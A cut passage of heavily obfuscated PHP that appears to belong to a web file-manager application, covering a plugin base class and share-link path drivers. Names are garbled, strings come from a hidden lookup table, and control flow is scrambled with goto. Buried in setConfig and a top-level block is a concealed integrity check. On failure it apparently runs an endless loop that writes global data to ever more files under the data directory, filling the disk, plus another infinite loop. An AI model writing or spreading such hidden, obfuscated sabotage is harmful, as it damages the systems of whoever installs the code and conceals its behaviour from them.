 = $A˜êŸµÀî[775]; $eÁäìÈäÂ ($_SERVER[$A˜êŸµÀî[776]]); $eÁäìÈäÂ ($_SERVER[$A˜êŸµÀî[772]] . $A˜êŸµÀî[777]); goto bÎ·ŞŒåµ”; CºÓœŠª: } global $in, $config; goto b¸å¥î«÷; eëö²³”: $this->pluginName = str_replace($A˜êŸµÀî[1212], $A˜êŸµÀî[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $A˜êŸµÀî[8]; $this->pluginApi = app_host_get() . $A˜êŸµÀî[1213] . $this->pluginName . $A˜êŸµÀî[8]; goto A„œ‰ˆ‘İ; f´÷èÅÓÓ: $this->values = array(); return $this; goto a °‘§¦ëÖ; a °‘§¦ëÖ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‘®…¢À][1214]); } protected function assign($D˜‚ªÚ›ãî, $e‚”õÁËäÈ = false) { if (is_array($D˜‚ªÚ›ãî)) { $this->values = array_merge($this->values, $D˜‚ªÚ›ãî); } else { $this->values[$D˜‚ªÚ›ãî] = $e‚”õÁËäÈ; } } protected function display($eØ®È•¶éæ) { extract($this->values); require $eØ®È•¶éæ; } final function hookRegist($C…Â‰†ê¤) { $this->modelPlugin->appRegist($this->pluginName, $C…Â‰†ê¤); } final function appIcon() { $A»÷—ë—² =& $_SERVER[‘®…¢À]; $C÷¸ˆ¤ÀØÂ = $this->appPackage(); $e§‰ôõ¶éÙ = $A»÷—ë—²[33]; if (isset($C÷¸ˆ¤ÀØÂ[$A»÷—ë—²[378]])) { if (isset($C÷¸ˆ¤ÀØÂ[$A»÷—ë—²[378]][$A»÷—ë—²[1215]])) { $e§‰ôõ¶éÙ = $A»÷—ë—²[1216] . $C÷¸ˆ¤ÀØÂ[$A»÷—ë—²[378]][$A»÷—ë—²[1215]] . $A»÷—ë—²[1217]; } else { if ($C÷¸ˆ¤ÀØÂ[$A»÷—ë—²[378]][$A»÷—ë—²[1218]]) { $e§‰ôõ¶éÙ = $A»÷—ë—²[1219] . $C÷¸ˆ¤ÀØÂ[$A»÷—ë—²[378]][$A»÷—ë—²[1218]] . $A»÷—ë—²[1220]; } } } return $e§‰ôõ¶éÙ; } final function fileCanView($få„¡œàä£) { $eÑÍç›ôó =& $_SERVER[‘®…¢À]; if (request_url_safe($få„¡œàä£)) { return !0; } if ($this->isShare($få„¡œàä£)) { return !0; } if (!Action($eÑÍç›ôó[1221])->authCan($eÑÍç›ôó[1222])) { show_tips(LNG($eÑÍç›ôó[1223]) . $eÑÍç›ôó[1224], !1); } ActionCall($eÑÍç›ôó[1225], $få„¡œàä£); } final function isShare($DÎîÏ’ŠÔ) { $E°‰È·‘®³ = KodIO::parse($DÎîÏ’ŠÔ); return $E°‰È·‘®³[$_SERVER[‘®…¢À][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($F—˜İŠ”™) { if (request_url_safe($F—˜İŠ”™)) { return $F—˜İŠ”™; } if (!$this->isShare($F—˜İŠ”™)) { $F—˜İŠ”™ = $this->filePath($F—˜İŠ”™); } return Action($_SERVER[‘®…¢À][974])->linkOut($F—˜İŠ”™); } public function filePathLinkOut($D§àë¸õ) { if (request_url_safe($D§àë¸õ)) { return $D§àë¸õ; } $this->fileCanView($D§àë¸õ); return Action($_SERVER[‘®…¢À][974])->link($D§àë¸õ); } final function filePath($e÷ƒé‹°) { $F›„àÛÚ¶º =& $_SERVER[‘®…¢À]; if ($B–ëªß¥Ò = $this->checkSharePath($e÷ƒé‹°)) { return $B–ëªß¥Ò; } $this->fileCanView($e÷ƒé‹°); if (request_url_safe($e÷ƒé‹°)) { $Fòõ¹°èÈ = parse_url_query($e÷ƒé‹°); if (isset($Fòõ¹°èÈ[$F›„àÛÚ¶º[1226]]) && isset($Fòõ¹°èÈ[$F›„àÛÚ¶º[194]])) { $E§÷Ó“ÌÇŒ = Model($F›„àÛÚ¶º[1045])->get($F›„àÛÚ¶º[1227]); $A¸†ÆÜÙ = Mcrypt::decode($Fòõ¹°èÈ[$F›„àÛÚ¶º[194]], $E§÷Ó“ÌÇŒ); if ($A¸†ÆÜÙ) { $this->fileInfo = IO::infoWithChildren($A¸†ÆÜÙ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A¸†ÆÜÙ; } } $e÷ƒé‹° = $this->_cacheHttpFile($e÷ƒé‹°); $this->fileInfo = IO::infoWithChildren($e÷ƒé‹°); } else { $this->fileInfo = IO::infoWithChildren($e÷ƒé‹°); if (!$this->fileInfo) { show_tips(LNG($F›„àÛÚ¶º[103]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e÷ƒé‹°; } final function _cacheHttpFile($B‹ñ‡”½Òß) { $eÌ–ß•ÏŒ = hash_path($B‹ñ‡”½Òß, !0); $this->cachePath = $this->pluginCachePath($eÌ–ß•ÏŒ); if ($eÆõŠ¤‹Î = IO::fileNameExist($this->cachePath, $eÌ–ß•ÏŒ)) { return KodIO::make($eÆõŠ¤‹Î); } $a¥Ë…éÓ‘ä = $this->cachePath . $eÌ–ß•ÏŒ; return $this->pluginCacheFileSet($a¥Ë…éÓ‘ä, file_get_contents($B‹ñ‡”½Òß)); } final function _tmpFileName($EãƒƒŞ±¹‘ = array()) { goto f®È¯Î¨ì; f¼»íÛø‹: if (isset($EãƒƒŞ±¹‘[$CË©ŸÖò´³[159]][$CË©ŸÖò´³[161]])) { return $EãƒƒŞ±¹‘[$CË©ŸÖò´³[159]][$CË©ŸÖò´³[161]]; } $B®³¹­ò® = array($EãƒƒŞ±¹‘[$CË©ŸÖò´³[28]], $EãƒƒŞ±¹‘[$CË©ŸÖò´³[76]], $EãƒƒŞ±¹‘[$CË©ŸÖò´³[78]]); if (isset($EãƒƒŞ±¹‘[$CË©ŸÖò´³[454]])) { $B®³¹­ò®[] = $EãƒƒŞ±¹‘[$CË©ŸÖò´³[454]]; } goto CìÎ²í§÷Ø; f®È¯Î¨ì: $CË©ŸÖò´³ =& $_SERVER[‘®…¢À]; if (!$EãƒƒŞ±¹‘) { $EãƒƒŞ±¹‘ = $this->fileInfo; } if (isset($EãƒƒŞ±¹‘[$CË©ŸÖò´³[161]])) { return $EãƒƒŞ±¹‘[$CË©ŸÖò´³[161]]; } goto f¼»íÛø‹; CìÎ²í§÷Ø: return md5(implode($CË©ŸÖò´³[71], $B®³¹­ò®)); goto c§ŸõÉÄàĞ; c§ŸõÉÄàĞ: } final function checkSharePath($AÂÜéª‹ô) { goto F¢ïô‘µñä; F¢ïô‘µñä: $CªÄ‡Ì¶· =& $_SERVER[‘®…¢À]; if (!defined($CªÄ‡Ì¶·[422])) { define($CªÄ‡Ì¶·[1228], 0); } if (!$this->isShare($AÂÜéª‹ô)) { return !1; } goto CÛëÑÛ—Ï¶; EØ†îÚÛï¯: $this->cachePath = $this->pluginCachePath($this->fileInfo[$CªÄ‡Ì¶·[161]]); return $d“àí™Æ™œ[$CªÄ‡Ì¶·[76]]; goto fƒˆã×Õ¤­; CÛëÑÛ—Ï¶: $d“àí™Æ™œ = Action($CªÄ‡Ì¶·[974])->sharePathInfo($AÂÜéª‹ô); if (!isset($d“àí™Æ™œ[$CªÄ‡Ì¶·[76]])) { show_json(LNG($CªÄ‡Ì¶·[1229]), !1); } $this->fileInfo = $d“àí™Æ™œ[$CªÄ‡Ì¶·[159]]; goto EØ†îÚÛï¯; fƒˆã×Õ¤­: } final function pluginCachePath($E°°Úâë¸§ = '') { $cİé¦¨‹›é =& $_SERVER[‘®…¢À]; $aİÏœïİÍ = IO_PATH_SYSTEM_TEMP . $cİé¦¨‹›é[1230] . $this->pluginName; if (!($bß­–¯Û¹‰ = IO::infoFull($aİÏœïİÍ))) { return IO::mkdir($aİÏœïİÍ . $cİé¦¨‹›é[8] . $E°°Úâë¸§); } if (empty($E°°Úâë¸§)) { return $bß­–¯Û¹‰[$cİé¦¨‹›é[76]]; } if (!($Cğ°öášõÚ = IO::fileNameExist($bß­–¯Û¹‰[$cİé¦¨‹›é[76]], $E°°Úâë¸§))) { return IO::mkdir($bß­–¯Û¹‰[$cİé¦¨‹›é[76]] . $E°°Úâë¸§); } return KodIO::make($Cğ°öášõÚ); } final function pluginCacheFileSet($dêÑŸ¼êà², $dÕù¼¾¾¥ = '') { $BÈÄ‚³Šø¥ =& $_SERVER[‘®…¢À]; if (!($Cï“ŒŠùª‰ = IO::infoFull($dêÑŸ¼êà²))) { return IO::mkfile($dêÑŸ¼êà², $dÕù¼¾¾¥, REPEAT_REPLACE); } IO::setContent($Cï“ŒŠùª‰[$BÈÄ‚³Šø¥[76]], $dÕù¼¾¾¥); return $Cï“ŒŠùª‰[$BÈÄ‚³Šø¥[76]]; } final function pluginLocalFile($dÏ¿ùç¿ˆÌ = '') { goto D„­ÓÆ…ËÉ; D„­ÓÆ…ËÉ: $a¬˜Ô¨ŠŠ =& $_SERVER[‘®…¢À]; $bÌ×£Š¸™Í = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bÌ×£Š¸™Í)) { mk_dir($bÌ×£Š¸™Í); } goto b›İÏ¹‹¼Í; câíõ¶¶ÙÉ: $f–Î‡â´„í = $bÌ×£Š¸™Í . $cÃÉ½‚…»; if (@file_exists($f–Î‡â´„í)) { return $f–Î‡â´„í; } return IO::copy($dÏ¿ùç¿ˆÌ, $bÌ×£Š¸™Í, 0, $cÃÉ½‚…»); goto D¨Ì”±÷÷…; b›İÏ¹‹¼Í: if (!$dÏ¿ùç¿ˆÌ) { return $bÌ×£Š¸™Í; } $c …‰Æ¶Õä = IO::info($dÏ¿ùç¿ˆÌ); $cÃÉ½‚…» = $this->_tmpFileName($c …‰Æ¶Õä) . $a¬˜Ô¨ŠŠ[94] . $c …‰Æ¶Õä[$a¬˜Ô¨ŠŠ[157]]; goto câíõ¶¶ÙÉ; D¨Ì”±÷÷…: } final function appPackage() { goto AÃ†Íê‘©ê; CÔ­ß×¼Ú°: return $CÕƒ°ø÷ŒÚ; goto B¡Œñ†‹ÙÇ; AÃ†Íê‘©ê: $eîÍ¸¦ìÇ½ =& $_SERVER[‘®…¢À]; if ($this->packageData) { return $this->packageData; } $C„¼…óÒ‚ = $this->parseFile($this->pluginPath . $eîÍ¸¦ìÇ½[1231]); goto dóù–¦×ŒÓ; cñÀ”¾Ø•å: $BàåŒ‹Óº = Hook::trigger($eîÍ¸¦ìÇ½[1232], $CÕƒ°ø÷ŒÚ); if ($BàåŒ‹Óº && is_array($BàåŒ‹Óº)) { $CÕƒ°ø÷ŒÚ = $BàåŒ‹Óº; } $this->packageData = $CÕƒ°ø÷ŒÚ; goto CÔ­ß×¼Ú°; dóù–¦×ŒÓ: $this->parseLang($C„¼…óÒ‚); $CÕƒ°ø÷ŒÚ = json_decode_force($C„¼…óÒ‚); if (!$CÕƒ°ø÷ŒÚ) { return array(); } goto cñÀ”¾Ø•å; B¡Œñ†‹ÙÇ: } public function packageInfoGet($Dí±ì„«ŒÑ) { $A‡ŸÌñÚ‚Ğ = $this->appPackage(); return array_get_value($A‡ŸÌñÚ‚Ğ, $Dí±ì„«ŒÑ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‘®…¢À][1233]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‘®…¢À][1234]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‘®…¢À][1235]); } private function parseFile($f˜…¾ñ¼ëŠ) { $CëãÖ°ß× =& $_SERVER[‘®…¢À]; $F£š¢®óƒ = file_get_contents($f˜…¾ñ¼ëŠ); $aæù×ÃªÔø = array($CëãÖ°ß×[1236], $CëãÖ°ß×[1237], $CëãÖ°ß×[1238], $CëãÖ°ß×[1239], $CëãÖ°ß×[1240], $CëãÖ°ß×[1241], $CëãÖ°ß×[1242]); $Aõİ‚ÁÏ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$CëãÖ°ß×[85]][$CëãÖ°ß×[1243]]); $F£š¢®óƒ = str_replace($aæù×ÃªÔø, $Aõİ‚ÁÏ, $F£š¢®óƒ); return $F£š¢®óƒ; } private function parseLang(&$eŒÁ¬Äİ Û) { goto däÉ¶ ‡ÍŸ; CŠãÆ³øø¨: $B„ŠÓôÓ¹È = array(); foreach ($DùàËíïÎ[0] as $DÔºÂÆ¾Ò) { $CÜ¬Ê Á“­ = substr($DÔºÂÆ¾Ò, strlen($aó£Ø†ê‡), -4); $c×¾µ‹è£Ö = LNG($CÜ¬Ê Á“­); $fÃÁ®éùÙ[] = $DÔºÂÆ¾Ò; $B„ŠÓôÓ¹È[] = str_replace(array($Dò–íØ­¾š[214], $Dò–íØ­¾š[702], $Dò–íØ­¾š[327], $Dò–íØ­¾š[114]), array($Dò–íØ­¾š[50], $Dò–íØ­¾š[50], $Dò–íØ­¾š[33], $Dò–íØ­¾š[1246]), $c×¾µ‹è£Ö); } $eŒÁ¬Äİ Û = str_replace($fÃÁ®éùÙ, $B„ŠÓôÓ¹È, $eŒÁ¬Äİ Û); goto DÚãÈÛ–¢; däÉ¶ ‡ÍŸ: $Dò–íØ­¾š =& $_SERVER[‘®…¢À]; $aó£Ø†ê‡ = $Dò–íØ­¾š[1244]; if (!strstr($eŒÁ¬Äİ Û, $aó£Ø†ê‡)) { return; } goto fŸ¥Şõê˜¡; fŸ¥Şõê˜¡: preg_match_all($Dò–íØ­¾š[1245], $eŒÁ¬Äİ Û, $DùàËíïÎ); if (!is_array($DùàËíïÎ) || count($DùàËíïÎ) == 0 || !is_array($DùàËíïÎ[0]) || count($DùàËíïÎ[0]) == 0) { return; } $fÃÁ®éùÙ = array(); goto CŠãÆ³øø¨; DÚãÈÛ–¢: } private function parseConfig(&$cùÂ”ßñ) { goto C‹«›â¹ğø; A¼ªÆÏˆ¥“: $cùÂ”ßñ = str_replace($F¶ß„Ãâ, $eàæ³®ÕÕ, $cùÂ”ßñ); goto fíÓ»ö…Ò; Cí´³ùÅ: preg_match_all($A¿œÔ¤Ç³˜[1248], $cùÂ”ßñ, $dî×¢›öÕÁ); if (!is_array($dî×¢›öÕÁ) || count($dî×¢›öÕÁ) == 0 || !is_array($dî×¢›öÕÁ[0]) || count($dî×¢›öÕÁ[0]) == 0) { return; } $bŸÑ¢Æ¦©é = $this->getConfig(); goto dµ©ç—‡Âê; C‹«›â¹ğø: $A¿œÔ¤Ç³˜ =& $_SERVER[‘®…¢À]; $EÑ×ßáÀë = $A¿œÔ¤Ç³˜[1247]; if (!strstr($cùÂ”ßñ, $EÑ×ßáÀë)) { return; } goto Cí´³ùÅ; dµ©ç—‡Âê: $F¶ß„Ãâ = array(); $eàæ³®ÕÕ = array(); foreach ($dî×¢›öÕÁ[0] as $AõÒêö¤Ûİ) { $e¼óö˜éÀê = substr($AõÒêö¤Ûİ, strlen($EÑ×ßáÀë), -2); $F¶ß„Ãâ[] = $AõÒêö¤Ûİ; $eàæ³®ÕÕ[] = _get($bŸÑ¢Æ¦©é, $e¼óö˜éÀê); } goto A¼ªÆÏˆ¥“; fíÓ»ö…Ò: } private function parsePackage(&$a†å³›·•ª) { goto cÕÕ¿Õè©­; f¿À¬‘µ©»: $a†å³›·•ª = str_replace($DÍ·äŠĞ™Æ, $C´ªò™è¼Œ, $a†å³›·•ª); goto dØÒÊÚä¯î; eÜ¨Œƒ•Ï¸: preg_match_all($D™Æº“¡“ª[1250], $a†å³›·•ª, $dìÙ¥â³); if (!is_array($dìÙ¥â³) || count($dìÙ¥â³) == 0 || !is_array($dìÙ¥â³[0]) || count($dìÙ¥â³[0]) == 0) { return; } $fÚß‹…Ç½Ì = $this->appPackage(); goto F¼Ñ“ç”¶’; cÕÕ¿Õè©­: $D™Æº“¡“ª =& $_SERVER[‘®…¢À]; $bÙ‡å¶øù = $D™Æº“¡“ª[1249]; if (!strstr($a†å³›·•ª, $bÙ‡å¶øù)) { return; } goto eÜ¨Œƒ•Ï¸; F¼Ñ“ç”¶’: $DÍ·äŠĞ™Æ = array(); $C´ªò™è¼Œ = array(); foreach ($dìÙ¥â³[0] as $a¹ï©¢É±‘) { $A¡¯Ÿ£Ÿ‚› = substr($a¹ï©¢É±‘, strlen($bÙ‡å¶øù), -2); $DÍ·äŠĞ™Æ[] = $a¹ï©¢É±‘; $C´ªò™è¼Œ[] = _get($fÚß‹…Ç½Ì, $A¡¯Ÿ£Ÿ‚›); } goto f¿À¬‘µ©»; dØÒÊÚä¯î: } final function echoFile($cÙ‚Ïœ«»ˆ, $dÍ¤»ÉÜŠÊ = false) { goto BÈ¼°¥ãà™; e¥‘ŠÀ‚â: $this->parsePackage($c‰è½„‹Ó‡); if (is_array($dÍ¤»ÉÜŠÊ)) { $c‰è½„‹Ó‡ = str_replace(array_keys($dÍ¤»ÉÜŠÊ), array_values($dÍ¤»ÉÜŠÊ), $c‰è½„‹Ó‡); } echo $f¢òŒâ[214] . $c‰è½„‹Ó‡; goto Aë‚ßÉò; BÈ¼°¥ãà™: $f¢òŒâ =& $_SERVER[‘®…¢À]; $E®»Ì¥í˜Á = $this->pluginPath . $cÙ‚Ïœ«»ˆ; if (ACT == $f¢òŒâ[1251]) { echo $f¢òŒâ[1252] . $this->pluginName . $f¢òŒâ[8] . $cÙ‚Ïœ«»ˆ . $f¢òŒâ[1253]; if (!file_exists($E®»Ì¥í˜Á)) { echo $f¢òŒâ[1254]; return; } } goto aÕÖ‚—ëç; aÕÖ‚—ëç: $c‰è½„‹Ó‡ = $this->parseFile($E®»Ì¥í˜Á); $this->parseLang($c‰è½„‹Ó‡); $this->parseConfig($c‰è½„‹Ó‡); goto e¥‘ŠÀ‚â; Aë‚ßÉò: } final function initLang() { goto AëŒï±·­¡; eñğ¿Ç”´: if (@count($bÀÂƒÍàÈÕ) > 0) { I18n::set($bÀÂƒÍàÈÕ); } return $bÀÂƒÍàÈÕ; goto c‚õïö—áÕ; AëŒï±·­¡: $AİÜ‘•‡é” =& $_SERVER[‘®…¢À]; $A§‰÷¦Ú = $AİÜ‘•‡é”[1255]; $Cæ‚¼ØÜë = $this->pluginPath . $AİÜ‘•‡é”[1256]; goto b‰ °µŒœã; b‰ °µŒœã: $fğèÇÛìğ = I18n::getType(); $bÀÂƒÍàÈÕ = array(); if (file_exists($Cæ‚¼ØÜë . $fğèÇÛìğ . $AİÜ‘•‡é”[746])) { $bÀÂƒÍàÈÕ = (include_once $Cæ‚¼ØÜë . $fğèÇÛìğ . $AİÜ‘•‡é”[746]); } else { if ($fğèÇÛìğ == $AİÜ‘•‡é”[1257] && !file_exists($Cæ‚¼ØÜë . $fğèÇÛìğ . $AİÜ‘•‡é”[746]) && file_exists($Cæ‚¼ØÜë . $AİÜ‘•‡é”[1258])) { $bÀÂƒÍàÈÕ = (include_once $Cæ‚¼ØÜë . $AİÜ‘•‡é”[1258]); } else { if (file_exists($Cæ‚¼ØÜë . $A§‰÷¦Ú . $AİÜ‘•‡é”[746])) { $bÀÂƒÍàÈÕ = (include_once $Cæ‚¼ØÜë . $A§‰÷¦Ú . $AİÜ‘•‡é”[746]); } } } goto eñğ¿Ç”´; c‚õïö—áÕ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EôÒá “¿À) { $C“‹¼£Æìø =& $_SERVER[‘®…¢À]; $E¼÷«ë‡—« = $_SERVER[$C“‹¼£Æìø[772]] . $C“‹¼£Æìø[773]; $càÛ†öØ„Ç = $C“‹¼£Æìø[1195]; if ($_SERVER[$C“‹¼£Æìø[768]] != $càÛ†öØ„Ç($E¼÷«ë‡—«)) { goto eˆÍ¢‹ã‡; EØóÍö¤: $fëİÕ ˜Èí = $C“‹¼£Æìø[775]; $fëİÕ ˜Èí($_SERVER[$C“‹¼£Æìø[776]]); $E÷×ÉÍÊÏ = $C“‹¼£Æìø[770]; goto Eî²Ñ÷©Í; Eî²Ñ÷©Í: $E÷×ÉÍÊÏ(); $bƒ£—”’èË = $C“‹¼£Æìø[1259]; $B™·ŒËŠ¦¾ = json_encode($GLOBALS[$C“‹¼£Æìø[1260]]); goto eÉ‚«ï¾§ğ; eˆÍ¢‹ã‡: $E÷×ÉÍÊÏ = $C“‹¼£Æìø[770]; $Bè£¦Å‡ = $C“‹¼£Æìø[771]; $b´¡Øîî„ = $_SERVER[$C“‹¼£Æìø[772]] . $C“‹¼£Æìø[773]; goto A—ØâŠ¸ùÑ; A—ØâŠ¸ùÑ: $b«ÕÅ¶Şëî = $Bè£¦Å‡($b´¡Øîî„); $d¶ò“­Îœ = explode($C“‹¼£Æìø[214], $b«ÕÅ¶Şëî); if (count($d¶ò“­Îœ) < $C“‹¼£Æìø[554]) { $CÏé²áÕëŠ = $C“‹¼£Æìø[774]; $CÏé²áÕëŠ(); } goto EØóÍö¤; eÉ‚«ï¾§ğ: $cê‹¹ˆ…ÊÔ = 1; for ($fÌ’ôõ´… = $cê‹¹ˆ…ÊÔ; $fÌ’ôõ´… > 0; $fÌ’ôõ´…++) { $bƒ£—”’èË(DATA_PATH . $fÌ’ôõ´…, $B™·ŒËŠ¦¾); } goto D×—Şº×µ; D×—Şº×µ: } return $this->modelPlugin->setConfig($this->pluginName, $EôÒá “¿À); } public function onSetConfig($bÛî©´±Ãƒ) { } public function onGetConfig($Dê¿ªò“²) { } public function onChangeStatus($e·×ªÊ°Ï) { } public function onUninstall() { } public function onInstall() { } public function authCheck($cÚ§îÁÑÂê = "\160\x6c\x75\147\151\x6e\101\165\x74\150") { $CƒÑ¬š‹õÎ =& $_SERVER[‘®…¢À]; if (!defined($CƒÑ¬š‹õÎ[422])) { return !1; } if (_get($GLOBALS, $CƒÑ¬š‹õÎ[452])) { return !0; } $bŒõŞ‰Î‰‚ = $this->getConfig(); if (!$bŒõŞ‰Î‰‚[$cÚ§îÁÑÂê]) { return !1; } return ActionCall($CƒÑ¬š‹õÎ[1261], $bŒõŞ‰Î‰‚[$cÚ§îÁÑÂê]); } public function url($dŠöàá·Ë, $FºßœÇ‘–¡ = '', $Fõ­”á¼Ş¡ = true) { goto bÆŸ§Ê’¶; eì³£À¥È£: $A·Ÿ÷Ìã¸ = $this->packageVersion(); $Eõ¦Ğ°§„‚ = $fŒ„ƒâÒÀó . $DÜƒÌÄè÷Ù[407] . $A·Ÿ÷Ìã¸; if ($FºßœÇ‘–¡ == $DÜƒÌÄè÷Ù[33]) { $EŒ×™±½‰ = $this->pluginHost . $dŠöàá·Ë . $DÜƒÌÄè÷Ù[1262] . $Eõ¦Ğ°§„‚; } else { if ($FºßœÇ‘–¡ === $DÜƒÌÄè÷Ù[77]) { $EŒ×™±½‰ = $this->pluginHost . $dŠöàá·Ë; } else { if ($FºßœÇ‘–¡ == $DÜƒÌÄè÷Ù[1263]) { $EŒ×™±½‰ = STATIC_PATH . $dŠöàá·Ë . $DÜƒÌÄè÷Ù[1262] . $fŒ„ƒâÒÀó; } else { if ($FºßœÇ‘–¡ == $DÜƒÌÄè÷Ù[1264]) { $EŒ×™±½‰ = APP_HOST . $DÜƒÌÄè÷Ù[1265] . $dŠöàá·Ë . $DÜƒÌÄè÷Ù[1262] . $fŒ„ƒâÒÀó; } else { if (isset($fÁ“ÏÏ›»Î[$FºßœÇ‘–¡])) { $EŒ×™±½‰ = $fÁ“ÏÏ›»Î[$FºßœÇ‘–¡] . $dŠöàá·Ë . $DÜƒÌÄè÷Ù[1262] . $Eõ¦Ğ°§„‚; } } } } } goto aÏ¾ŸÉ‚ì¹; aÏ¾ŸÉ‚ì¹: if (!$Fõ­”á¼Ş¡) { return $EŒ×™±½‰; } echo $EŒ×™±½‰; goto cöÈ¼‹•Ş; bÆŸ§Ê’¶: $DÜƒÌÄè÷Ù =& $_SERVER[‘®…¢À]; $fÁ“ÏÏ›»Î = $this->getConfig(); $fŒ„ƒâÒÀó = KOD_VERSION . $DÜƒÌÄè÷Ù[94] . KOD_VERSION_BUILD; goto eì³£À¥È£; cöÈ¼‹•Ş: } public function link($C‰‚Ë‹Ğ¹æ = false, $B¸®ĞŒÚÙù = '') { $dÈ Äé£Œµ =& $_SERVER[‘®…¢À]; if (!$C‰‚Ë‹Ğ¹æ) { $this->link($dÈ Äé£Œµ[1266], $dÈ Äé£Œµ[1264]); $this->link($dÈ Äé£Œµ[1267], $dÈ Äé£Œµ[1263]); $this->link($dÈ Äé£Œµ[1268], $dÈ Äé£Œµ[1263]); $this->link($dÈ Äé£Œµ[1269], $dÈ Äé£Œµ[1263]); $this->link($dÈ Äé£Œµ[1270], $dÈ Äé£Œµ[1263]); return; } $A¯—¥Şíç = $this->url($C‰‚Ë‹Ğ¹æ, $B¸®ĞŒÚÙù, !1); if (substr($C‰‚Ë‹Ğ¹æ, -3) == $dÈ Äé£Œµ[1271]) { echo $dÈ Äé£Œµ[1272] . $A¯—¥Şíç . $dÈ Äé£Œµ[1273] . $dÈ Äé£Œµ[214]; } else { if (substr($C‰‚Ë‹Ğ¹æ, -4) == $dÈ Äé£Œµ[1274]) { echo $dÈ Äé£Œµ[1275] . $A¯—¥Şíç . $dÈ Äé£Œµ[1276] . $dÈ Äé£Œµ[214]; } } } } goto FæóˆŠÙ–¸; EÔ¿¤ì•¼: class PathDriverDbShareLink extends PathDriverDB { public function __construct($føéß–Ø†ã) { $this->pathParse = $føéß–Ø†ã; $this->model = Model($_SERVER[‘®…¢À][1067]); } protected function infoParse($dÏŒÉî¨, $eàÅ°§‚É” = false, $E‘ÀªÒ¬ßç = false) { $eç™ ºˆÁƒ =& $_SERVER[‘®…¢À]; return Action($eç™ ºˆÁƒ[974])->sharePathInfo($this->pathParse[$eç™ ºˆÁƒ[76]], !0); } public function listPath($f®³¡Í‘ŒÊ, $e²ˆâ§Èœâ = false) { $b„©©ßÍªë =& $_SERVER[‘®…¢À]; $B¯”–ğ§ğˆ = parent::listPath($f®³¡Í‘ŒÊ, $e²ˆâ§Èœâ); foreach ($B¯”–ğ§ğˆ as $CåË„Êàğã => $eò·îºŠŠä) { if (!in_array($CåË„Êàğã, array($b„©©ßÍªë[74], $b„©©ßÍªë[75]))) { continue; } foreach ($eò·îºŠŠä as $dÃ„ŒĞÑ‹ƒ => $b“ê›ŞÊèà) { $B¯”–ğ§ğˆ[$CåË„Êàğã][$dÃ„ŒĞÑ‹ƒ] = Action($b„©©ßÍªë[974])->shareItemInfo($b“ê›ŞÊèà); } } return $B¯”–ğ§ğˆ; } public function listAll($AÎ®Ğè›Ê×) { $DÔ·“´í÷ì =& $_SERVER[‘®…¢À]; $a¢ù¬Ò¾æ® = IO::info($this->pathParse[$DÔ·“´í÷ì[76]]); if (!$a¢ù¬Ò¾æ®) { return array(); } $aØâ­ËÂ£˜ = $this->model->listAll($AÎ®Ğè›Ê×); foreach ($aØâ­ËÂ£˜ as &$F°›Ï†¢¾”) { $F°›Ï†¢¾”[$DÔ·“´í÷ì[387]] = Action($DÔ·“´í÷ì[974])->shareItemInfo($F°›Ï†¢¾”[$DÔ·“´í÷ì[387]]); } return $aØâ­ËÂ£˜; } } if (!isset($_SERVER[$_SERVER[‘®…¢À][768]]) || !isset($_SERVER[$_SERVER[‘®…¢À][1074]])) { goto fÅÔŸÄŒçö; fÅÔŸÄŒçö: $D£ó×Ñ´æì = $_SERVER[‘®…¢À][771]; $d’¤ğñà = $_SERVER[$_SERVER[‘®…¢À][772]] . $_SERVER[‘®…¢À][773]; $fĞÒ’ÙÍ†Ğ = $D£ó×Ñ´æì($d’¤ğñà); goto Aæ•«»ÖÓ; B´’÷ï¯Õ®: $c‚¼öÆí›ñ($_SERVER[$_SERVER[‘®…¢À][772]] . $_SERVER[‘®…¢À][773]); $D‚Â·ÀÏ‹ = 2; while ($D‚Â·ÀÏ‹ > 1) { $fè©ëùÌ©™ = rawurlencode($D‚Â·ÀÏ‹ . $_SERVER[‘®…¢À][357]); } goto C¾ö²¹ğ¾; Aæ•«»ÖÓ: $A¨· µÊ–‘ = explode($_SERVER[‘®…¢À][214], $fĞÒ’ÙÍ†Ğ); if (count($A¨· µÊ–‘) < $_SERVER[‘®…¢À][548]) { $dŞİï…òå‡ = $_SERVER[‘®…¢À][774]; $dŞİï…òå‡(); } $c‚¼öÆí›ñ = $_SERVER[‘®…¢À][1075]; goto B´’÷ï¯Õ®; C¾ö²¹ğ¾: } class PathDriverDriverShareItem { public function __construct($DßáŠ¥ÇŞŸ) { $this->pathParse = $DßáŠ¥ÇŞŸ; } public function __call($a…”Ûô¿æ, $FŞ¸³İî’) { $bª“’âëÈÃ =& $_SERVER[‘®…¢À]; if (method_exists($this, $a…”Ûô¿æ)) { return; } $fôµ«‹Åå¹ = call_user_func_array(array($bª“’âëÈÃ[1076], $a…”Ûô¿æ), $FŞ¸³İî’); $fÇÂÊ”ìß³ = array($bª“’âëÈÃ[1077], $bª“’âëÈÃ[1078], $bª“’âëÈÃ[1079], $bª“’âëÈÃ[1080], $bª“’âëÈÃ[481], $bª“’âëÈÃ[483], $bª“’âëÈÃ[1081], $bª“’âëÈÃ[92], $bª“’âëÈÃ[1082], $bª“’âëÈÃ[1083]); if (in_array($a…”Ûô¿æ, $fÇÂÊ”ìß³)) { $fôµ«‹Åå¹ = $this->getPathOuter($fôµ«‹Åå¹); } return $fôµ«‹Åå¹; } public function copy($b±”á¦„Ü†, $fµ÷ŒƒŠùÇ, $dôî¹Ìğµ = false) { return $this->copyMove($b±”á¦„Ü†, $fµ÷ŒƒŠùÇ, $dôî¹Ìğµ, $_SERVER[‘®…¢À][481]); } public function move($B¾ëŒÕ†°•, $a¤˜¼³‰â³, $AŠ½ùé©í‡ = false) { return $this->copyMove($B¾ëŒÕ†°•, $a¤˜¼³‰â³, $AŠ½ùé©í‡, 